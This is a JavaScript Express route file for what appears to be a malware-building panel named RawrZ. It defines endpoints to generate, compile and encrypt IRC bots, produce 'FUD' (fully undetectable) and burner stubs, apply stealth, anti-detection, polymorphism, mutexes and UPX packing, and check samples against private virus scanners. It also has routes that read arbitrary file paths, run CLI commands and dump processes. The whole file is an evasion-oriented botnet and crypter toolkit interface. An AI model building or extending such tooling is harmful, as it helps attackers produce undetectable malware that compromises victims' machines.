app.post('/irc-bot/encrypt-stub',requireAuth,async(req,res)=>{try{const{stubCode,algorithm='aes256',key,iv}=req.body||{};if(!stubCode||!algorithm)return res.status(400).json({error:'stubCode and algorithm are required'});const result=await rawrz.encrypt(algorithm,stubCode);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/irc-bot/save-encrypted-stub',requireAuth,async(req,res)=>{try{const{stubCode,algorithm='aes256',filename,key,iv}=req.body||{};if(!stubCode||!filename)return res.status(400).json({error:'stubCode and filename are required'});const encrypted=await rawrz.encrypt(algorithm,stubCode);const result=await rawrz.uploadFile(filename,encrypted.encrypted);res.json({success:true,result,encrypted})}catch(e){res.status(500).json({error:e.message})}});

// Burner Encryption endpoints
app.post('/irc-bot/burn-encrypt',requireAuth,async(req,res)=>{try{const{botCode,language,options={}}=req.body||{};if(!botCode||!language)return res.status(400).json({error:'botCode and language are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.burnEncryptBot(botCode,language,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/irc-bot/generate-burner-stub',requireAuth,async(req,res)=>{try{const{config,features,extensions,options={}}=req.body||{};if(!config||!features||!extensions)return res.status(400).json({error:'config, features, and extensions are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.generateBurnerStub(config,features,extensions,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/irc-bot/generate-fud-stub',requireAuth,async(req,res)=>{try{const{config,features,extensions,options={}}=req.body||{};if(!config||!features||!extensions)return res.status(400).json({error:'config, features, and extensions are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.generateFUDStub(config,features,extensions,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/irc-bot/burner-status',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=botGenerator.getBurnerModeStatus();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/irc-bot/fud-score',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=botGenerator.getFUDScore();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/irc-bot/templates',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.listTemplates();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/irc-bot/test',requireAuth,async(req,res)=>{try{const{config}=req.body||{};if(!config)return res.status(400).json({error:'config is required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.testBot(config);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/irc-bot/compile',requireAuth,async(req,res)=>{try{const{code,language,config}=req.body||{};if(!code||!language)return res.status(400).json({error:'code and language are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.compileBot(code,language,config);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/irc-bot/templates',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.getTemplates();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/irc-bot/features',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.getAvailableFeatures();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Custom Feature Management endpoints
app.post('/irc-bot/custom-features/add',requireAuth,async(req,res)=>{try{const{featureName,featureConfig}=req.body||{};if(!featureName||!featureConfig)return res.status(400).json({error:'featureName and featureConfig are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.addCustomFeature(featureName,featureConfig);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.put('/irc-bot/custom-features/update/:featureName',requireAuth,async(req,res)=>{try{const{featureName}=req.params;const{updates}=req.body||{};if(!updates)return res.status(400).json({error:'updates are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.updateCustomFeature(featureName,updates);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.delete('/irc-bot/custom-features/remove/:featureName',requireAuth,async(req,res)=>{try{const{featureName}=req.params;const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.removeCustomFeature(featureName);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/irc-bot/custom-features/:featureName',requireAuth,async(req,res)=>{try{const{featureName}=req.params;const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.getCustomFeature(featureName);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/irc-bot/custom-features',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.listCustomFeatures();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Feature Template Management endpoints
app.post('/irc-bot/feature-templates/create',requireAuth,async(req,res)=>{try{const{templateName,templateConfig}=req.body||{};if(!templateName||!templateConfig)return res.status(400).json({error:'templateName and templateConfig are required'});const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.createFeatureTemplate(templateName,templateConfig);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/irc-bot/feature-templates/:templateName',requireAuth,async(req,res)=>{try{const{templateName}=req.params;const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.getFeatureTemplate(templateName);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/irc-bot/feature-templates',requireAuth,async(_req,res)=>{try{const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.listFeatureTemplates();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.delete('/irc-bot/feature-templates/:templateName',requireAuth,async(req,res)=>{try{const{templateName}=req.params;const botGenerator=await rawrzEngine.loadModule('irc-bot-generator');await botGenerator.initialize({mutex:{}});const result=await botGenerator.deleteFeatureTemplate(templateName);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/hash',requireAuth,async(req,res)=>{try{const{input,algorithm='sha256',save=false,extension}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});res.json(await rawrz.hash(input,algorithm,!!save,extension))}catch(e){res.status(500).json({error:e.message})}});
app.post('/encrypt',requireAuth,async(req,res)=>{try{const{algorithm,input,extension}=req.body||{};if(!algorithm||!input)return res.status(400).json({error:'algorithm and input required'});res.json(await rawrz.encrypt(algorithm,input,extension))}catch(e){res.status(500).json({error:e.message})}});
app.post('/encrypt-file', requireAuth, async (req, res) => {
    try {
        // Optimized handler for /encrypt-file
        const result = await handlePOSTencryptfile(req, res);
        res.json({ success: true, result });
    } catch (error) {
        console.error('[ERROR] /encrypt-file failed:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});
app.post('/decrypt',requireAuth,async(req,res)=>{try{const{algorithm,input,key,iv,extension}=req.body||{};if(!algorithm||!input)return res.status(400).json({error:'algorithm and input required'});res.json(await rawrz.decrypt(algorithm,input,key,iv,extension))}catch(e){res.status(500).json({error:e.message})}});
app.get('/dns', requireAuth, async (req, res) => {
    try {
        // Optimized handler for /dns
        const result = await handleGETdns(req, res);
        res.json({ success: true, result });
    } catch (error) {
        console.error('[ERROR] /dns failed:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});
app.get('/ping', requireAuth, async (req, res) => {
    try {
        // Optimized handler for /ping
        const result = await handleGETping(req, res);
        res.json({ success: true, result });
    } catch (error) {
        console.error('[ERROR] /ping failed:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});
app.get('/files',requireAuth,async(_req,res)=>{try{res.json(await rawrz.listFiles())}catch(e){res.status(500).json({error:e.message})}});
app.post('/upload',requireAuth,async(req,res)=>{try{const{filename,base64}=req.body||{};if(!filename||!base64)return res.status(400).json({error:'filename and base64 required'});res.json(await rawrz.uploadFile(filename,base64))}catch(e){res.status(500).json({error:e.message})}});
app.get('/download', requireAuth, async (req, res) => {
    try {
        // Optimized handler for /download
        const result = await handleGETdownload(req, res);
        res.json({ success: true, result });
    } catch (error) {
        console.error('[ERROR] /download failed:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});
app.post('/cli',requireAuth,async(req,res)=>{try{const{command,args=[]}=req.body||{};if(!command)return res.status(400).json({error:'command required'});const i=new RawrZStandalone();const out=await i.processCommand([command,...args]);res.json({success:true,result:out})}catch(e){res.status(500).json({error:e.message})}});
app.post('/stub',requireAuth,async(req,res)=>{try{const{target,options={}}=req.body||{};if(!target)return res.status(400).json({error:'target is required'});const rawrz=new RawrZStandalone();const result=await rawrz.generateStub(target,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/compile-asm',requireAuth,async(req,res)=>{try{const{asmFile,outputName,format='exe'}=req.body||{};if(!asmFile)return res.status(400).json({error:'asmFile is required'});const rawrz=new RawrZStandalone();const result=await rawrz.compileAssembly(asmFile,outputName,format);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/compile-js',requireAuth,async(req,res)=>{try{const{jsFile,outputName,format='exe',includeNode=false}=req.body||{};if(!jsFile)return res.status(400).json({error:'jsFile is required'});const rawrz=new RawrZStandalone();const result=await rawrz.compileJavaScript(jsFile,outputName,format,includeNode);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/keygen',requireAuth,async(req,res)=>{try{const{algorithm='aes256',length=256,save=false,extension='.key'}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.generateKey(algorithm,length,save,extension);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/advancedcrypto',requireAuth,async(req,res)=>{try{const{input,operation='encrypt'}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.advancedCrypto(input,operation);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/sign',requireAuth,async(req,res)=>{try{const{input,privatekey}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.signData(input,privatekey);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/verify',requireAuth,async(req,res)=>{try{const{input,signature,publickey}=req.body||{};if(!input||!signature||!publickey)return res.status(400).json({error:'input, signature, and publickey are required'});const rawrz=new RawrZStandalone();const result=await rawrz.verifySignature(input,signature,publickey);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/base64encode',requireAuth,async(req,res)=>{try{const{input}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.base64Encode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/base64decode',requireAuth,async(req,res)=>{try{const{input}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.base64Decode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/hexencode',requireAuth,async(req,res)=>{try{const{input}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.hexEncode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/hexdecode',requireAuth,async(req,res)=>{try{const{input}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.hexDecode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/urlencode',requireAuth,async(req,res)=>{try{const{input}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.urlEncode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/urldecode',requireAuth,async(req,res)=>{try{const{input}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.urlDecode(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/random',requireAuth,async(req,res)=>{try{const{length=32}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.generateRandom(length);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/uuid',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.generateUUID();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/password',requireAuth,async(req,res)=>{try{const{length=16,includeSpecial=true}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.generatePassword(length,includeSpecial);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/analyze',requireAuth,async(req,res)=>{try{const{input}=req.body||{};if(!input)return res.status(400).json({error:'input is required'});const rawrz=new RawrZStandalone();const result=await rawrz.analyzeFile(input);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/sysinfo',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.systemInfo();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/processes',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.listProcesses();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/portscan',requireAuth,async(req,res)=>{try{const{host,startPort=1,endPort=1000}=req.body||{};if(!host)return res.status(400).json({error:'host is required'});const rawrz=new RawrZStandalone();const result=await rawrz.portScan(host,startPort,endPort);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/traceroute',requireAuth,async(req,res)=>{try{const{host}=req.body||{};if(!host)return res.status(400).json({error:'host is required'});const rawrz=new RawrZStandalone();const result=await rawrz.traceroute(host);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/whois',requireAuth,async(req,res)=>{try{const{domain}=req.body||{};if(!domain)return res.status(400).json({error:'domain is required'});const rawrz=new RawrZStandalone();const result=await rawrz.whois(domain);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/fileops',requireAuth,async(req,res)=>{try{const{operation,input,output}=req.body||{};if(!operation||!input)return res.status(400).json({error:'operation and input are required'});const rawrz=new RawrZStandalone();const result=await rawrz.fileOperations(operation,input,output);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/textops',requireAuth,async(req,res)=>{try{const{operation,input,options={}}=req.body||{};if(!operation||!input)return res.status(400).json({error:'operation and input are required'});const rawrz=new RawrZStandalone();const result=await rawrz.textOperations(operation,input,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/validate',requireAuth,async(req,res)=>{try{const{input,type}=req.body||{};if(!input||!type)return res.status(400).json({error:'input and type are required'});const rawrz=new RawrZStandalone();const result=await rawrz.validate(input,type);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/time',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.getTime();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/math',requireAuth,async(req,res)=>{try{const{expression}=req.body||{};if(!expression)return res.status(400).json({error:'expression is required'});const rawrz=new RawrZStandalone();const result=await rawrz.mathOperation(expression);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Additional endpoints for complete panel functionality
app.post('/download-file',requireAuth,async(req,res)=>{try{const{url}=req.body||{};if(!url)return res.status(400).json({error:'url is required'});const rawrz=new RawrZStandalone();const result=await rawrz.downloadFile(url);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/read-file',requireAuth,async(req,res)=>{try{const{filepath}=req.body||{};if(!filepath)return res.status(400).json({error:'filepath is required'});const rawrz=new RawrZStandalone();const result=await rawrz.readAbsoluteFile(filepath);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/read-local-file',requireAuth,async(req,res)=>{try{const{filename}=req.body||{};if(!filename)return res.status(400).json({error:'filename is required'});const rawrz=new RawrZStandalone();const result=await rawrz.readLocalFile(filename);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Advanced Features endpoints
app.post('/stealth-mode',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['stealth',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/anti-detection',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['antidetect',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/polymorphic',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['polymorphic',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Mutex and UPX endpoints
app.post('/mutex/generate',requireAuth,async(req,res)=>{try{const{language='cpp',pattern='standard',options={}}=req.body||{};const MutexEngine=await rawrzEngine.loadModule('mutex-engine');const mutexEngine=new MutexEngine();await mutexEngine.initialize({});const result=mutexEngine.generateMutexCode(language,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/mutex/apply',requireAuth,async(req,res)=>{try{const{code,language,options={}}=req.body||{};if(!code||!language)return res.status(400).json({error:'code and language are required'});const MutexEngine=await rawrzEngine.loadModule('mutex-engine');const mutexEngine=new MutexEngine();await mutexEngine.initialize({});const result=await mutexEngine.applyMutexToCode(code,language,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/mutex/options', requireAuth, async (req, res) => {
    try {
        // Optimized handler for /mutex/options
        const result = await handleGETmutexoptions(req, res);
        res.json({ success: true, result });
    } catch (error) {
        console.error('[ERROR] /mutex/options failed:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/upx/pack',requireAuth,async(req,res)=>{try{const{executablePath,method='upx',options={}}=req.body||{};if(!executablePath)return res.status(400).json({error:'executablePath is required'});const stubGenerator=await rawrzEngine.loadModule('stub-generator');await stubGenerator.initialize({});const result=await stubGenerator.applyPacking(executablePath,method);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/upx/methods', requireAuth, async (req, res) => {
    try {
        // Optimized handler for /upx/methods
        const result = await handleGETupxmethods(req, res);
        res.json({ success: true, result });
    } catch (error) {
        console.error('[ERROR] /upx/methods failed:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});
app.post('/upx/status',requireAuth,async(req,res)=>{try{const{executablePath}=req.body||{};if(!executablePath)return res.status(400).json({error:'executablePath is required'});const stubGenerator=await rawrzEngine.loadModule('stub-generator');await stubGenerator.initialize({});const result=await stubGenerator.checkPackingStatus(executablePath);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Jotti Scanner endpoints
app.post('/jotti/scan',requireAuth,async(req,res)=>{try{const{filePath,options={}}=req.body||{};if(!filePath)return res.status(400).json({error:'filePath is required'});const result=await jottiScanner.scanFile(filePath,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/jotti/scan-multiple',requireAuth,async(req,res)=>{try{const{filePaths,options={}}=req.body||{};if(!filePaths||!Array.isArray(filePaths))return res.status(400).json({error:'filePaths array is required'});const result=await jottiScanner.scanMultipleFiles(filePaths,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/jotti/info',requireAuth,async(_req,res)=>{try{const result=jottiScanner.getScannerInfo();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/jotti/active-scans',requireAuth,async(_req,res)=>{try{const result=jottiScanner.getActiveScans();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/jotti/scan-history',requireAuth,async(req,res)=>{try{const{limit=10}=req.query||{};const result=jottiScanner.getScanHistory(parseInt(limit));res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/jotti/scan-status/:jobId',requireAuth,async(req,res)=>{try{const{jobId}=req.params||{};if(!jobId)return res.status(400).json({error:'jobId is required'});const result=jottiScanner.getScanStatus(jobId);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/jotti/cancel-scan',requireAuth,async(req,res)=>{try{const{jobId}=req.body||{};if(!jobId)return res.status(400).json({error:'jobId is required'});const result=await jottiScanner.cancelScan(jobId);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/jotti/test-connection',requireAuth,async(_req,res)=>{try{const result=await jottiScanner.testConnection();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Private Virus Scanner endpoints
app.post('/private-scanner/scan',requireAuth,async(req,res)=>{try{const{filePath,options={}}=req.body||{};if(!filePath)return res.status(400).json({error:'filePath is required'});const result=await privateVirusScanner.scanFile(filePath,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/private-scanner/queue',requireAuth,async(req,res)=>{try{const{filePath,options={}}=req.body||{};if(!filePath)return res.status(400).json({error:'filePath is required'});const scanId=await privateVirusScanner.addToQueue(filePath,options);res.json({success:true,scanId})}catch(e){res.status(500).json({error:e.message})}});
app.get('/private-scanner/queue-status',requireAuth,async(_req,res)=>{try{const result=privateVirusScanner.getQueueStatus();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/private-scanner/engines',requireAuth,async(_req,res)=>{try{const result=privateVirusScanner.getEngineStatus();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/private-scanner/stats',requireAuth,async(_req,res)=>{try{const result=privateVirusScanner.getScannerStats();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/private-scanner/result/:scanId',requireAuth,async(req,res)=>{try{const{scanId}=req.params||{};if(!scanId)return res.status(400).json({error:'scanId is required'});const result=privateVirusScanner.getScanResult(scanId);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/private-scanner/history',requireAuth,async(req,res)=>{try{const{limit=100}=req.query||{};const result=privateVirusScanner.getScanHistory(parseInt(limit));res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/private-scanner/cancel/:scanId',requireAuth,async(req,res)=>{try{const{scanId}=req.params||{};if(!scanId)return res.status(400).json({error:'scanId is required'});const result=await privateVirusScanner.cancelQueuedScan(scanId);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/private-scanner/clear-queue',requireAuth,async(_req,res)=>{try{const result=await privateVirusScanner.clearQueue();res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/private-scanner/queue-settings',requireAuth,async(req,res)=>{try{const{settings}=req.body||{};const result=privateVirusScanner.updateQueueSettings(settings);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/hot-patch',requireAuth,async(req,res)=>{try{const{target,type,data}=req.body||{};if(!target||!type)return res.status(400).json({error:'target and type are required'});const result=await hotPatchers.applyPatch(target,type,data);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/patch-rollback',requireAuth,async(req,res)=>{try{const{patchId}=req.body||{};if(!patchId)return res.status(400).json({error:'patchId is required'});const result=await hotPatchers.revertPatch(patchId);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Mobile & Device endpoints
app.post('/mobile-scan',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['mobile',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/app-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['appanalyze',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/device-forensics',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['device',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// API Status & Performance endpoints
app.get('/api-status',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['apistatus']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/performance-monitor',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['perfmon']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/memory-info',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['meminfo']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/garbage-collect',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['gc']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/memory-cleanup',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['memclean']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/cpu-usage',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['cpu']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/disk-usage',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['disk']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/network-stats',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['netstats']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// File Operations endpoints
app.post('/file-signature',requireAuth,async(req,res)=>{try{const{filepath}=req.body||{};if(!filepath)return res.status(400).json({error:'filepath is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['filesig',filepath]);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/backup',requireAuth,async(req,res)=>{try{const{source,destination}=req.body||{};if(!source)return res.status(400).json({error:'source is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['backup',source,destination||'backup']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/restore',requireAuth,async(req,res)=>{try{const{backup,destination}=req.body||{};if(!backup)return res.status(400).json({error:'backup is required'});const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['restore',backup,destination||'restored']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.get('/backup-list',requireAuth,async(req,res)=>{try{const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['backuplist']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});

// Analysis Tools endpoints
app.post('/behavior-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['behavior',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/signature-check',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['sigcheck',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/forensics-scan',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['forensics',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/data-recovery',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['recovery',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/timeline-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['timeline',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/disassembly',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['disasm',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/decompilation',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['decompile',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/string-extraction',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['strings',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/memory-analysis',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['memanalysis',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
app.post('/process-dump',requireAuth,async(req,res)=>{try{const{target}=req.body||{};const rawrz=new RawrZStandalone();const result=await rawrz.processCommand(['procdump',target||'test']);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
